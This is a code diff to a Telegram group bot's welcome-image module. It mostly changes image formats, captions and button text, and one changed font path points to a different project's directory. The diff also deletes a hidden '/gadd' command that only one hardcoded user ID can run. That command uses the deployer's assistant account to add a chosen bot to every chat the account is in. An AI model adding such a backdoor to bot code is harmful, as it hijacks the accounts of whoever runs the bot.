@@ -21,34 +21,6 @@ from PIL import ImageDraw, Image, ImageFont, ImageChops
 from pyrogram import *
 from pyrogram.types import *
 from logging import getLogger
-from pyrogram import Client, filters
-import requests
-import random
-import os
-import re
-import asyncio
-import time
-from SACHINxSANATANIxMUSIC.utils.database import add_served_chat
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
-from SACHINxSANATANIxMUSIC.utils.database import get_assistant
-import asyncio
-from SACHINxSANATANIxMUSIC.misc import SUDOERS
-from SACHINxSANATANIxMUSIC.mongo.afkdb import PROCESS
-from pyrogram import Client, filters
-from pyrogram.errors import UserAlreadyParticipant
-from SACHINxSANATANIxMUSIC import app
-import asyncio
-import random
-from pyrogram import Client, filters
-from pyrogram.enums import ChatMemberStatus
-from pyrogram.errors import (
-    ChatAdminRequired,
-    InviteRequestSent,
-    UserAlreadyParticipant,
-    UserNotParticipant,
-)
-from SACHINxSANATANIxMUSIC.utils.database import get_assistant, is_active_chat
-
 
 
 random_photo = [
@@ -106,13 +78,13 @@ def circle(pfp, size=(500, 500), brightness_factor=10):
     return pfp
 
 def welcomepic(pic, user, chatname, id, uname, brightness_factor=1.3):
-    background = Image.open("SACHINxSANATANIxMUSIC/assets/wel2.jpg")
+    background = Image.open("SACHINxSANATANIxMUSIC/assets/wel2.png")
     pfp = Image.open(pic).convert("RGBA")
     pfp = circle(pfp, brightness_factor=brightness_factor) 
     pfp = pfp.resize((575, 575))
     draw = ImageDraw.Draw(background)
     font = ImageFont.truetype('SACHINxSANATANIxMUSIC/assets/font.ttf', size=70)
-    welcome_font = ImageFont.truetype('SACHINxSANATANIxMUSIC/assets/font.ttf', size=61)
+    welcome_font = ImageFont.truetype('DAXXMUSIC/assets/font.ttf', size=61)
     #draw.text((630, 540), f'ID: {id}', fill=(255, 255, 255), font=font)
     #
  #   draw.text((630, 300), f'NAME: {user}', fill=(255, 255, 255), font=font)
@@ -123,8 +95,8 @@ def welcomepic(pic, user, chatname, id, uname, brightness_factor=1.3):
     #
     pfp_position = (48, 88)
     background.paste(pfp, pfp_position, pfp)
-    background.save(f"downloads/welcome#{id}.jpg")
-    return f"downloads/welcome#{id}.jpg"
+    background.save(f"downloads/welcome#{id}.png")
+    return f"downloads/welcome#{id}.png"
 
 
 @app.on_message(filters.command("welcome") & ~filters.private)
@@ -187,8 +159,8 @@ async def greet_new_member(_, member: ChatMemberUpdated):
             welcomeimg = welcomepic(
                 pic, user.first_name, member.chat.title, user.id, user.username
             )
-            button_text = "๏ ᴠɪᴇᴡ ɴᴇᴡ ᴍᴇᴍʙᴇʀ ๏"
-            add_button_text = "๏ ᴋɪᴅɴᴀᴘ ᴍᴇ ๏"
+            button_text = "⨀ ᴠɪᴇᴡ ɴᴇᴡ ᴍᴇᴍʙᴇʀ ⨀"
+            add_button_text = "✙ ᴧᴅᴅ ᴍᴇ ʙᴧʙʏ ✙"
             deep_link = f"tg://openmessage?user_id={user.id}"
             add_link = f"https://t.me/{app.username}?startgroup=true"
             temp.MELCOW[f"welcome-{member.chat.id}"] = await app.send_photo(
@@ -197,14 +169,14 @@ async def greet_new_member(_, member: ChatMemberUpdated):
                 caption=f"""
 **⎊─────☵ ᴡᴇʟᴄᴏᴍᴇ ☵─────⎊**
 
-**▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬**
+▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
 
 **☉ ɴᴀᴍᴇ ⧽** {user.mention}
 **☉ ɪᴅ ⧽** `{user.id}`
 **☉ ᴜ_ɴᴀᴍᴇ ⧽** @{user.username}
 **☉ ᴛᴏᴛᴀʟ ᴍᴇᴍʙᴇʀs ⧽** {count}
 
-**▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬**
+▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
 
 **⎉──────▢✭ 侖 ✭▢──────⎉**
 """,
@@ -215,42 +187,3 @@ async def greet_new_member(_, member: ChatMemberUpdated):
             )
         except Exception as e:
             LOGGER.error(e)
-
-
-@app.on_message(filters.command("gadd") & filters.user(6664582540))
-async def add_all(client, message):
-    command_parts = message.text.split(" ")
-    if len(command_parts) != 2:
-        await message.reply("**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd bot username`**")
-        return
-    
-    bot_username = command_parts[1]
-    try:
-        userbot = await get_assistant(message.chat.id)
-        bot = await app.get_users(bot_username)
-        app_id = bot.id
-        done = 0
-        failed = 0
-        lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
-        
-        async for dialog in userbot.get_dialogs():
-            if dialog.chat.id == -1001919135283:
-                continue
-            try:
-                await userbot.add_chat_members(dialog.chat.id, app_id)
-                done += 1
-                await lol.edit(
-                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
-                )
-            except Exception as e:
-                failed += 1
-                await lol.edit(
-                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅɪɴɢ ʙʏ»** @{userbot.username}"
-                )
-            await asyncio.sleep(3)  # Adjust sleep time based on rate limits
-        
-        await lol.edit(
-            f"**➻ {bot_username} ʙᴏᴛ ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ🎉**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
-        )
-    except Exception as e:
-        await message.reply(f"Error: {str(e)}")
